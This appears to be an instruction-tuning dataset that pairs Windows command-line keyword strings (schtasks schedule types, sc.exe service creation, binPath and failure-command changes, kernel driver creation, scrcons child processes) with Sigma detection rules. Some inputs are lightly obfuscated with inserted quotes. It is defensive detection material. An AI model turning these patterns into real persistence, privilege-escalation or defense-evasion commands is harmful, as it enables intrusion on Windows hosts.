{"instruction": "Write Sigma rule to detect payload:", "input": "\\schtasks.exe schtasks.exe ONLOGON \"ONS\"TART ONCE ONIDLE NT AUT SYSTEM HIGHEST", "output": "title: Suspicious Schtasks Schedule Types\nid: 24c8392b-aa3c-46b7-a545-43f71657fe98\nrelated:\n    - id: 7a02e22e-b885-4404-b38b-1ddc7e65258a\n      type: similar\nstatus: test\ndescription: Detects scheduled task creations or modification on a suspicious schedule type\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\n    - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-09\ntags:\n    - attack.execution\n    - attack.t1053.005\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\schtasks.exe'\n        - OriginalFileName: 'schtasks.exe'\n    selection_time:\n        CommandLine|contains:\n            - ' ONLOGON '\n            - ' ONSTART '\n            - ' ONCE '\n            - ' ONIDLE '\n    filter_privs:\n        CommandLine|contains:\n            - 'NT AUT' # This covers the usual NT AUTHORITY\\SYSTEM\n            - ' SYSTEM' # SYSTEM is a valid value for schtasks hence it gets it's own value with space\n            - 'HIGHEST'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Legitimate processes that run at logon. Filter according to your environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\schtasks schtasks ONLOGON ONSTART ONCE ONIDLE NT AUT SYSTEM HIGHEST", "output": "title: Suspicious Schtasks Schedule Types\nid: 24c8392b-aa3c-46b7-a545-43f71657fe98\nrelated:\n    - id: 7a02e22e-b885-4404-b38b-1ddc7e65258a\n      type: similar\nstatus: test\ndescription: Detects scheduled task creations or modification on a suspicious schedule type\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\n    - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-09\ntags:\n    - attack.execution\n    - attack.t1053.005\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\schtasks.exe'\n        - OriginalFileName: 'schtasks.exe'\n    selection_time:\n        CommandLine|contains:\n            - ' ONLOGON '\n            - ' ONSTART '\n            - ' ONCE '\n            - ' ONIDLE '\n    filter_privs:\n        CommandLine|contains:\n            - 'NT AUT' # This covers the usual NT AUTHORITY\\SYSTEM\n            - ' SYSTEM' # SYSTEM is a valid value for schtasks hence it gets it's own value with space\n            - 'HIGHEST'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Legitimate processes that run at logon. Filter according to your environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\schtasks.exe schtasks.exe ONLOGON ONSTART ONCE ONIDLE NT AUT SYSTEM HIGHEST", "output": "title: Suspicious Schtasks Schedule Types\nid: 24c8392b-aa3c-46b7-a545-43f71657fe98\nrelated:\n    - id: 7a02e22e-b885-4404-b38b-1ddc7e65258a\n      type: similar\nstatus: test\ndescription: Detects scheduled task creations or modification on a suspicious schedule type\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\n    - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-09\ntags:\n    - attack.execution\n    - attack.t1053.005\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\schtasks.exe'\n        - OriginalFileName: 'schtasks.exe'\n    selection_time:\n        CommandLine|contains:\n            - ' ONLOGON '\n            - ' ONSTART '\n            - ' ONCE '\n            - ' ONIDLE '\n    filter_privs:\n        CommandLine|contains:\n            - 'NT AUT' # This covers the usual NT AUTHORITY\\SYSTEM\n            - ' SYSTEM' # SYSTEM is a valid value for schtasks hence it gets it's own value with space\n            - 'HIGHEST'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Legitimate processes that run at logon. Filter according to your environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\scrcons.exe \\svchost.exe \\dllhost.exe \\powershell.exe \\pwsh.exe \\wscript.exe \\cscript.exe \\schtasks.exe \\regsvr32.exe \\mshta.exe \\rundll32.exe \\msiexec.exe \\msbuild.exe", "output": "title: Script Event Consumer Spawning Process\nid: f6d1dd2f-b8ce-40ca-bc23-062efb686b34\nstatus: test\ndescription: Detects a suspicious child process of Script Event Consumer (scrcons.exe).\nreferences:\n    - https://redcanary.com/blog/child-processes/\n    - https://docs.paloaltonetworks.com/cortex/cortex-xdr/cortex-xdr-analytics-alert-reference/cortex-xdr-analytics-alert-reference/scrcons-exe-rare-child-process.html\nauthor: Sittikorn S\ndate: 2021-06-21\nmodified: 2022-07-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\scrcons.exe'\n        Image|endswith:\n            - '\\svchost.exe'\n            - '\\dllhost.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\schtasks.exe'\n            - '\\regsvr32.exe'\n            - '\\mshta.exe'\n            - '\\rundll32.exe'\n            - '\\msiexec.exe'\n            - '\\msbuild.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\scrcons.exe \\svchost.exe \\dllhost.exe \\powershell.exe \\pwsh.exe \\wscript.exe \\cscript.exe \"\\schtasks.exe\" \\regsvr32.exe \\mshta.exe \\rundll32.exe \\msiexec.exe \\msbuild.exe", "output": "title: Script Event Consumer Spawning Process\nid: f6d1dd2f-b8ce-40ca-bc23-062efb686b34\nstatus: test\ndescription: Detects a suspicious child process of Script Event Consumer (scrcons.exe).\nreferences:\n    - https://redcanary.com/blog/child-processes/\n    - https://docs.paloaltonetworks.com/cortex/cortex-xdr/cortex-xdr-analytics-alert-reference/cortex-xdr-analytics-alert-reference/scrcons-exe-rare-child-process.html\nauthor: Sittikorn S\ndate: 2021-06-21\nmodified: 2022-07-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\scrcons.exe'\n        Image|endswith:\n            - '\\svchost.exe'\n            - '\\dllhost.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\schtasks.exe'\n            - '\\regsvr32.exe'\n            - '\\mshta.exe'\n            - '\\rundll32.exe'\n            - '\\msiexec.exe'\n            - '\\msbuild.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\scrcons \\svchost \\dllhost \\powershell \\pwsh \\wscript \\cscript \\schtasks \\regsvr32 \\mshta \\rundll32 \\msiexec \\msbuild", "output": "title: Script Event Consumer Spawning Process\nid: f6d1dd2f-b8ce-40ca-bc23-062efb686b34\nstatus: test\ndescription: Detects a suspicious child process of Script Event Consumer (scrcons.exe).\nreferences:\n    - https://redcanary.com/blog/child-processes/\n    - https://docs.paloaltonetworks.com/cortex/cortex-xdr/cortex-xdr-analytics-alert-reference/cortex-xdr-analytics-alert-reference/scrcons-exe-rare-child-process.html\nauthor: Sittikorn S\ndate: 2021-06-21\nmodified: 2022-07-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\scrcons.exe'\n        Image|endswith:\n            - '\\svchost.exe'\n            - '\\dllhost.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\schtasks.exe'\n            - '\\regsvr32.exe'\n            - '\\mshta.exe'\n            - '\\rundll32.exe'\n            - '\\msiexec.exe'\n            - '\\msbuild.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\scrcons.exe \\svchost.exe \\dllhost.exe \\powershell.exe \\pwsh.exe \\wscript.exe \\cscript.exe \\schtasks.exe \\regsvr32.exe \\mshta.exe \\rundll32.exe \\msiexec.exe \\msbuild.exe", "output": "title: Script Event Consumer Spawning Process\nid: f6d1dd2f-b8ce-40ca-bc23-062efb686b34\nstatus: test\ndescription: Detects a suspicious child process of Script Event Consumer (scrcons.exe).\nreferences:\n    - https://redcanary.com/blog/child-processes/\n    - https://docs.paloaltonetworks.com/cortex/cortex-xdr/cortex-xdr-analytics-alert-reference/cortex-xdr-analytics-alert-reference/scrcons-exe-rare-child-process.html\nauthor: Sittikorn S\ndate: 2021-06-21\nmodified: 2022-07-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\scrcons.exe'\n        Image|endswith:\n            - '\\svchost.exe'\n            - '\\dllhost.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\schtasks.exe'\n            - '\\regsvr32.exe'\n            - '\\mshta.exe'\n            - '\\rundll32.exe'\n            - '\\msiexec.exe'\n            - '\\msbuild.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe config binPath failure command", "output": "title: Possible Privilege Escalation via Weak Service Permissions\nid: d937b75f-a665-4480-88a5-2f20e9f9b22a\nstatus: test\ndescription: Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://pentestlab.blog/2017/03/30/weak-service-permissions/\nauthor: Teymur Kheirkhabarov\ndate: 2019-10-26\nmodified: 2024-12-01\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    scbynonadmin:\n        Image|endswith: '\\sc.exe'\n        IntegrityLevel:\n            - 'Medium'\n            - 'S-1-16-8192'\n    selection_binpath:\n        CommandLine|contains|all:\n            - 'config'\n            - 'binPath'\n    selection_failure:\n        CommandLine|contains|all:\n            - 'failure'\n            - 'command'\n    condition: scbynonadmin and 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe config \"binPath\" failure command", "output": "title: Possible Privilege Escalation via Weak Service Permissions\nid: d937b75f-a665-4480-88a5-2f20e9f9b22a\nstatus: test\ndescription: Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://pentestlab.blog/2017/03/30/weak-service-permissions/\nauthor: Teymur Kheirkhabarov\ndate: 2019-10-26\nmodified: 2024-12-01\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    scbynonadmin:\n        Image|endswith: '\\sc.exe'\n        IntegrityLevel:\n            - 'Medium'\n            - 'S-1-16-8192'\n    selection_binpath:\n        CommandLine|contains|all:\n            - 'config'\n            - 'binPath'\n    selection_failure:\n        CommandLine|contains|all:\n            - 'failure'\n            - 'command'\n    condition: scbynonadmin and 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe config binPath failure command", "output": "title: Possible Privilege Escalation via Weak Service Permissions\nid: d937b75f-a665-4480-88a5-2f20e9f9b22a\nstatus: test\ndescription: Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://pentestlab.blog/2017/03/30/weak-service-permissions/\nauthor: Teymur Kheirkhabarov\ndate: 2019-10-26\nmodified: 2024-12-01\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    scbynonadmin:\n        Image|endswith: '\\sc.exe'\n        IntegrityLevel:\n            - 'Medium'\n            - 'S-1-16-8192'\n    selection_binpath:\n        CommandLine|contains|all:\n            - 'config'\n            - 'binPath'\n    selection_failure:\n        CommandLine|contains|all:\n            - 'failure'\n            - 'command'\n    condition: scbynonadmin and 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc config binPath failure command", "output": "title: Possible Privilege Escalation via Weak Service Permissions\nid: d937b75f-a665-4480-88a5-2f20e9f9b22a\nstatus: test\ndescription: Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://pentestlab.blog/2017/03/30/weak-service-permissions/\nauthor: Teymur Kheirkhabarov\ndate: 2019-10-26\nmodified: 2024-12-01\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    scbynonadmin:\n        Image|endswith: '\\sc.exe'\n        IntegrityLevel:\n            - 'Medium'\n            - 'S-1-16-8192'\n    selection_binpath:\n        CommandLine|contains|all:\n            - 'config'\n            - 'binPath'\n    selection_failure:\n        CommandLine|contains|all:\n            - 'failure'\n            - 'command'\n    condition: scbynonadmin and 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe config binPath command failure", "output": "title: Possible Privilege Escalation via Weak Service Permissions\nid: d937b75f-a665-4480-88a5-2f20e9f9b22a\nstatus: test\ndescription: Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://pentestlab.blog/2017/03/30/weak-service-permissions/\nauthor: Teymur Kheirkhabarov\ndate: 2019-10-26\nmodified: 2024-12-01\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    scbynonadmin:\n        Image|endswith: '\\sc.exe'\n        IntegrityLevel:\n            - 'Medium'\n            - 'S-1-16-8192'\n    selection_binpath:\n        CommandLine|contains|all:\n            - 'config'\n            - 'binPath'\n    selection_failure:\n        CommandLine|contains|all:\n            - 'failure'\n            - 'command'\n    condition: scbynonadmin and 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe create binPath", "output": "title: New Service Creation Using Sc.EXE\nid: 85ff530b-261d-48c6-a441-facaa2e81e48\nrelated:\n    - id: c02e96b7-c63a-4c47-bd83-4a9f74afcfb2 # Using PowerShell\n      type: similar\nstatus: test\ndescription: Detects the creation of a new service using the \"sc.exe\" utility.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md\nauthor: Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community\ndate: 2023-02-20\ntags:\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains|all:\n            - 'create'\n            - 'binPath'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator or user creates a service for legitimate reasons.\n    - Software installation\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe \"create\" binPath", "output": "title: New Service Creation Using Sc.EXE\nid: 85ff530b-261d-48c6-a441-facaa2e81e48\nrelated:\n    - id: c02e96b7-c63a-4c47-bd83-4a9f74afcfb2 # Using PowerShell\n      type: similar\nstatus: test\ndescription: Detects the creation of a new service using the \"sc.exe\" utility.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md\nauthor: Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community\ndate: 2023-02-20\ntags:\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains|all:\n            - 'create'\n            - 'binPath'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator or user creates a service for legitimate reasons.\n    - Software installation\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe create binPath", "output": "title: New Service Creation Using Sc.EXE\nid: 85ff530b-261d-48c6-a441-facaa2e81e48\nrelated:\n    - id: c02e96b7-c63a-4c47-bd83-4a9f74afcfb2 # Using PowerShell\n      type: similar\nstatus: test\ndescription: Detects the creation of a new service using the \"sc.exe\" utility.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md\nauthor: Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community\ndate: 2023-02-20\ntags:\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains|all:\n            - 'create'\n            - 'binPath'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator or user creates a service for legitimate reasons.\n    - Software installation\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc create binPath", "output": "title: New Service Creation Using Sc.EXE\nid: 85ff530b-261d-48c6-a441-facaa2e81e48\nrelated:\n    - id: c02e96b7-c63a-4c47-bd83-4a9f74afcfb2 # Using PowerShell\n      type: similar\nstatus: test\ndescription: Detects the creation of a new service using the \"sc.exe\" utility.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md\nauthor: Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community\ndate: 2023-02-20\ntags:\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains|all:\n            - 'create'\n            - 'binPath'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator or user creates a service for legitimate reasons.\n    - Software installation\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe binPath create", "output": "title: New Service Creation Using Sc.EXE\nid: 85ff530b-261d-48c6-a441-facaa2e81e48\nrelated:\n    - id: c02e96b7-c63a-4c47-bd83-4a9f74afcfb2 # Using PowerShell\n      type: similar\nstatus: test\ndescription: Detects the creation of a new service using the \"sc.exe\" utility.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md\nauthor: Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community\ndate: 2023-02-20\ntags:\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains|all:\n            - 'create'\n            - 'binPath'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator or user creates a service for legitimate reasons.\n    - Software installation\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe sc.exe config start disabled demand", "output": "title: Service StartupType Change Via Sc.EXE\nid: 85c312b7-f44d-4a51-a024-d671c40b49fc\nstatus: test\ndescription: Detect the use of \"sc.exe\" to change the startup type of a service to \"disabled\" or \"demand\"\nreferences:\n    - https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-01\nmodified: 2023-03-04\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' config '\n            - 'start'\n        CommandLine|contains:\n            - 'disabled'\n            - 'demand'\n    condition: all of selection_*\nfalsepositives:\n    - False positives may occur with troubleshooting scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe sc.exe config start \"disabled\" \"demand\"", "output": "title: Service StartupType Change Via Sc.EXE\nid: 85c312b7-f44d-4a51-a024-d671c40b49fc\nstatus: test\ndescription: Detect the use of \"sc.exe\" to change the startup type of a service to \"disabled\" or \"demand\"\nreferences:\n    - https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-01\nmodified: 2023-03-04\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' config '\n            - 'start'\n        CommandLine|contains:\n            - 'disabled'\n            - 'demand'\n    condition: all of selection_*\nfalsepositives:\n    - False positives may occur with troubleshooting scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe sc.exe config start disabled demand", "output": "title: Service StartupType Change Via Sc.EXE\nid: 85c312b7-f44d-4a51-a024-d671c40b49fc\nstatus: test\ndescription: Detect the use of \"sc.exe\" to change the startup type of a service to \"disabled\" or \"demand\"\nreferences:\n    - https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-01\nmodified: 2023-03-04\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' config '\n            - 'start'\n        CommandLine|contains:\n            - 'disabled'\n            - 'demand'\n    condition: all of selection_*\nfalsepositives:\n    - False positives may occur with troubleshooting scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc sc config start disabled demand", "output": "title: Service StartupType Change Via Sc.EXE\nid: 85c312b7-f44d-4a51-a024-d671c40b49fc\nstatus: test\ndescription: Detect the use of \"sc.exe\" to change the startup type of a service to \"disabled\" or \"demand\"\nreferences:\n    - https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-01\nmodified: 2023-03-04\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' config '\n            - 'start'\n        CommandLine|contains:\n            - 'disabled'\n            - 'demand'\n    condition: all of selection_*\nfalsepositives:\n    - False positives may occur with troubleshooting scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe start sc.exe disabled demand config", "output": "title: Service StartupType Change Via Sc.EXE\nid: 85c312b7-f44d-4a51-a024-d671c40b49fc\nstatus: test\ndescription: Detect the use of \"sc.exe\" to change the startup type of a service to \"disabled\" or \"demand\"\nreferences:\n    - https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-01\nmodified: 2023-03-04\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' config '\n            - 'start'\n        CommandLine|contains:\n            - 'disabled'\n            - 'demand'\n    condition: all of selection_*\nfalsepositives:\n    - False positives may occur with troubleshooting scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe create config binPath type kernel", "output": "title: New Kernel Driver Via SC.EXE\nid: 431a1fdb-4799-4f3b-91c3-a683b003fc49\nstatus: test\ndescription: Detects creation of a new service (kernel driver) with the type \"kernel\"\nreferences:\n    - https://www.aon.com/cyber-solutions/aon_cyber_labs/yours-truly-signed-av-driver-weaponizing-an-antivirus-driver/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-14\nmodified: 2022-08-08\ntags:\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains:\n            - 'create'\n            - 'config'\n        CommandLine|contains|all:\n            - 'binPath'\n            - 'type'\n            - 'kernel'\n    condition: selection\nfalsepositives:\n    - Rare legitimate installation of kernel drivers via sc.exe\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe create config binPath ty\"pe\" kernel", "output": "title: New Kernel Driver Via SC.EXE\nid: 431a1fdb-4799-4f3b-91c3-a683b003fc49\nstatus: test\ndescription: Detects creation of a new service (kernel driver) with the type \"kernel\"\nreferences:\n    - https://www.aon.com/cyber-solutions/aon_cyber_labs/yours-truly-signed-av-driver-weaponizing-an-antivirus-driver/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-14\nmodified: 2022-08-08\ntags:\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains:\n            - 'create'\n            - 'config'\n        CommandLine|contains|all:\n            - 'binPath'\n            - 'type'\n            - 'kernel'\n    condition: selection\nfalsepositives:\n    - Rare legitimate installation of kernel drivers via sc.exe\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe create config binPath type kernel", "output": "title: New Kernel Driver Via SC.EXE\nid: 431a1fdb-4799-4f3b-91c3-a683b003fc49\nstatus: test\ndescription: Detects creation of a new service (kernel driver) with the type \"kernel\"\nreferences:\n    - https://www.aon.com/cyber-solutions/aon_cyber_labs/yours-truly-signed-av-driver-weaponizing-an-antivirus-driver/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-14\nmodified: 2022-08-08\ntags:\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains:\n            - 'create'\n            - 'config'\n        CommandLine|contains|all:\n            - 'binPath'\n            - 'type'\n            - 'kernel'\n    condition: selection\nfalsepositives:\n    - Rare legitimate installation of kernel drivers via sc.exe\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc create config binPath type kernel", "output": "title: New Kernel Driver Via SC.EXE\nid: 431a1fdb-4799-4f3b-91c3-a683b003fc49\nstatus: test\ndescription: Detects creation of a new service (kernel driver) with the type \"kernel\"\nreferences:\n    - https://www.aon.com/cyber-solutions/aon_cyber_labs/yours-truly-signed-av-driver-weaponizing-an-antivirus-driver/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-14\nmodified: 2022-08-08\ntags:\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains:\n            - 'create'\n            - 'config'\n        CommandLine|contains|all:\n            - 'binPath'\n            - 'type'\n            - 'kernel'\n    condition: selection\nfalsepositives:\n    - Rare legitimate installation of kernel drivers via sc.exe\nlevel: medium"}
